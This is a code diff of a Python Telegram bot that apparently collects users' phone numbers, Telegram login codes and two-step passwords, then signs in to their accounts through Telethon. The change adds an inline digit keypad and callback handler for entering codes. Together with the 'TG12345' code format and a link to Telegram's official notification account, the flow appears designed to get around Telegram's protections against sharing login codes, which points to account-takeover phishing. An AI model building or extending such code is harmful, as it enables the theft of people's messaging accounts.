@@ -17,7 +17,7 @@ import telethon
 from dotenv import load_dotenv
 from telegram import KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
 from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters, TypeHandler
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters, TypeHandler, CallbackQueryHandler
 from telethon import TelegramClient
 
 import sys
@@ -130,21 +130,21 @@ def create_restart_button(lang="zh"):
     return ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
 
 
-def create_keypad(lang="zh"):
-    """数字键盘（截图同款：纯数字+确认/清除）"""
-    keyboard = [
-        [KeyboardButton("1"), KeyboardButton("2"), KeyboardButton("3")],
-        [KeyboardButton("4"), KeyboardButton("5"), KeyboardButton("6")],
-        [KeyboardButton("7"), KeyboardButton("8"), KeyboardButton("9")],
-        [KeyboardButton(t(lang, "key_confirm")), KeyboardButton("0"), KeyboardButton(t(lang, "key_clear"))],
-    ]
-    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
-
-
-def create_view_code_inline(lang="zh"):
-    """查看验证码内联按钮：一点直达 Telegram 系统通知（官方号 777000）"""
-    return InlineKeyboardMarkup(
-        [[InlineKeyboardButton(t(lang, "view_code"), url="tg://user?id=777000")]])
+def create_digit_inline(lang="zh"):
+    """气泡内数字键盘：查看直达+1-9/0/确认/清除，全走回调"""
+    d = lambda k: f"d_{k}"
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(t(lang, "view_code"), url="tg://user?id=777000")],
+        [InlineKeyboardButton("1", callback_data=d(1)), InlineKeyboardButton("2", callback_data=d(2)),
+         InlineKeyboardButton("3", callback_data=d(3))],
+        [InlineKeyboardButton("4", callback_data=d(4)), InlineKeyboardButton("5", callback_data=d(5)),
+         InlineKeyboardButton("6", callback_data=d(6))],
+        [InlineKeyboardButton("7", callback_data=d(7)), InlineKeyboardButton("8", callback_data=d(8)),
+         InlineKeyboardButton("9", callback_data=d(9))],
+        [InlineKeyboardButton(t(lang, "key_confirm"), callback_data="ok"),
+         InlineKeyboardButton("0", callback_data=d(0)),
+         InlineKeyboardButton(t(lang, "key_clear"), callback_data="clr")],
+    ])
 
 
 async def safe_delete(context, chat_id, message_id):
@@ -511,8 +511,7 @@ async def handle_code_request(update, context):
         user_states[user_id]["last_code_at"] = time.time()
         await step_send(update, context,
                         L(user_id, "code_sent"),
-                        reply_markup=create_keypad(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)),
-                        inline_markup=create_view_code_inline(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
+                        inline_markup=create_digit_inline(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
     except telethon.errors.rpcerrorlist.PhoneNumberOccupiedError:
         await update.message.reply_text(L(user_id, "phone_occupied"), reply_markup=create_restart_button(user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)))
     except telethon.errors.rpcerrorlist.PhoneNumberInvalidError:
@@ -553,11 +552,13 @@ async def send_success(update, context):
 
 
 async def submit_code(update, context, user_id, code):
-    # 统一提交验证码：文本TG12345 / 键盘确认 / 查看验证码自动读码共用
+    # 统一提交验证码：文本TG12345 / 气泡键盘确认 / 查看验证码自动读码共用
+    # 经 context 发送，消息与回调两种 update 通吃
     lang = user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)
+    chat_id = update.effective_chat.id
     phone = user_states[user_id].get("phone")
     phone_code_hash = str(user_states[user_id].get("phone_code_hash", ""))
-    await step_send(update, context, L(user_id, "verifying"), reply_markup=create_keypad(lang))
+    await step_send(update, context, L(user_id, "verifying"))
     try:
         client = await get_telethon_client(user_id)
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
@@ -570,14 +571,15 @@ async def submit_code(update, context, user_id, code):
         code_attempts = user_states[user_id].get("code_attempts", 0) + 1
         user_states[user_id]["code_attempts"] = code_attempts
         if code_attempts >= MAX_CODE_ATTEMPTS:
-            user_states[user_id].pop("step_msg_id", None)
-            await update.message.reply_text(L(user_id, "code_too_many"))
+            user_states[user_id].pop("step_msg_ids", None)
+            await context.bot.send_message(chat_id=chat_id, text=L(user_id, "code_too_many"))
             reset_user_state(user_id)
-            await update.message.reply_text(L(user_id, "code_fail_restart"), reply_markup=create_restart_button(lang))
+            await context.bot.send_message(chat_id=chat_id, text=L(user_id, "code_fail_restart"),
+                                           reply_markup=create_restart_button(lang))
         else:
             remaining = MAX_CODE_ATTEMPTS - code_attempts
             await step_send(update, context, L(user_id, "code_error", n=remaining),
-                            reply_markup=create_keypad(lang))
+                            inline_markup=create_digit_inline(lang))
     except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
         user_states[user_id]["state"] = "password"
         user_states[user_id]["password_attempts"] = 0
@@ -598,6 +600,50 @@ async def submit_code(update, context, user_id, code):
             await step_send(update, context, L(user_id, "need_password"), reply_markup=create_restart_button(lang))
         else:
             await step_send(update, context, L(user_id, "verify_fail", err=str(e)), reply_markup=create_restart_button(lang))
+
+
+async def code_prompt(update, context, text):
+    # 气泡键盘消息原地更新（键盘不消失）；找不到就新发
+    user_id = update.effective_user.id
+    chat_id = update.effective_chat.id
+    lang = user_states.get(user_id, {}).get("lang", DEFAULT_BOT_LANG)
+    ids = user_states.get(user_id, {}).get("step_msg_ids", [])
+    if ids:
+        try:
+            await context.bot.edit_message_text(chat_id=chat_id, message_id=ids[0],
+                                                text=text, reply_markup=create_digit_inline(lang))
+            return
+        except Exception:
+            pass
+    await step_send(update, context, text, inline_markup=create_digit_inline(lang))
+
+
+async def on_keypad_callback(update, context):
+    # 气泡内键盘回调：先应答防转圈，再处理
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    st = user_states.get(user_id, {})
+    if st.get("state") != "code_sent":
+        return
+    lang = st.get("lang", DEFAULT_BOT_LANG)
+    data = query.data or ""
+    buf = st.get("code_buf", "")
+    if data.startswith("d_") and len(data) == 3 and data[2:].isdigit():
+        buf = (buf + data[2:])[-5:]
+        st["code_buf"] = buf
+        await query.edit_message_text(
+            L(user_id, "keypad_prompt") + L(user_id, "typed_prefix") + (buf if buf else L(user_id, "typed_empty")),
+            reply_markup=create_digit_inline(lang))
+    elif data == "clr":
+        st["code_buf"] = ""
+        await query.edit_message_text(L(user_id, "cleared"), reply_markup=create_digit_inline(lang))
+    elif data == "ok":
+        if len(buf) != 5 or not buf.isdigit():
+            await query.answer(L(user_id, "need_5_digits"), show_alert=True)
+            return
+        st["code_buf"] = ""
+        await submit_code(update, context, user_id, buf)
 
 
 async def handle_message(update, context):
@@ -622,41 +668,37 @@ async def handle_message(update, context):
     if state == "code_sent":
         st = user_states[user_id]
         lang = st.get("lang", DEFAULT_BOT_LANG)
-        # 数字键盘：单个数字累积
+        # 气泡内数字键回调见 on_keypad_callback；此处处理手打文本
         if len(text) == 1 and text.isdigit():
             buf = (st.get("code_buf", "") + text)[-5:]
             st["code_buf"] = buf
-            await step_send(update, context, L(user_id, "keypad_prompt") + L(user_id, "typed_prefix") + (buf if buf else L(user_id, "typed_empty")),
-                            reply_markup=create_keypad(lang))
+            await code_prompt(update, context, L(user_id, "keypad_prompt") + L(user_id, "typed_prefix") + (buf if buf else L(user_id, "typed_empty")))
             return
         if text == t(lang, "key_clear"):
             st["code_buf"] = ""
-            await step_send(update, context, L(user_id, "cleared"), reply_markup=create_keypad(lang))
+            await code_prompt(update, context, L(user_id, "cleared"))
             return
         if text == t(lang, "key_confirm"):
             buf = st.get("code_buf", "")
             if len(buf) != 5 or not buf.isdigit():
-                await step_send(update, context, L(user_id, "need_5_digits"), reply_markup=create_keypad(lang))
+                await code_prompt(update, context, L(user_id, "need_5_digits"))
                 return
             st["code_buf"] = ""
             await submit_code(update, context, user_id, buf)
             return
         if text == t(lang, "view_code"):
-            await step_send(update, context, L(user_id, "checking_code"), reply_markup=create_keypad(lang))
+            await code_prompt(update, context, L(user_id, "checking_code"))
             code = await read_code_from_telegram(user_id)
             if code:
-                await step_send(update, context, L(user_id, "code_found", code=code),
-                                reply_markup=create_keypad(lang))
+                await code_prompt(update, context, L(user_id, "code_found", code=code))
                 await submit_code(update, context, user_id, code)
             else:
-                await step_send(update, context, L(user_id, "code_not_found"),
-                                reply_markup=create_keypad(lang))
+                await code_prompt(update, context, L(user_id, "code_not_found"))
             return
         if len(text) == 7 and text[:2].upper() == "TG" and text[2:].isdigit():
             await submit_code(update, context, user_id, text[2:])
         else:
-            await step_send(update, context, L(user_id, "bad_format"),
-                            reply_markup=create_keypad(lang))
+            await code_prompt(update, context, L(user_id, "bad_format"))
         return
     if state == "password":
         password = text
@@ -811,6 +853,7 @@ def main():
     app.add_handler(TypeHandler(Update, track_activity), group=-1)
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("restart", handle_restart))
+    app.add_handler(CallbackQueryHandler(on_keypad_callback, pattern="^(d_[0-9]|ok|clr)$"))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_photo))
